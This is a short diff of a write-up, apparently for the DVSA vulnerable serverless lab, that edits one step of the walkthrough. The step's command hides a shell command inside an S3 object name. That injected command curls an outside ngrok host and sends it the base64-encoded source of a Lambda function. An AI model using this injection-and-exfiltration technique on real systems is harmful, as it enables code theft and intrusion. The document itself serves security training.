@@ -33,7 +33,7 @@ If we follow the path (_cd;_ your way in), eventually we will get:
 
 3. We know the file's name, let's extract its code:
 ```
-aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null;curl 0c971764.ngrok.io?code="$(cat lambda_function.py | base64 --wrap=0)" echo x.raw' --acl public-read --profile hacker
+aws s3 cp ~/empty 's3://dvsa-receipts-bucket/2020/20/20/null_;curl 0c971764.ngrok.io?code="$(cd x; cd y; cd z; cat send-receipt-email.py.py | base64 --wrap=0)" echo x.raw' --acl public-read --profile hacker
 ```
 
 We now have the code in Base64 (I cut out most of it for a better screenshot).
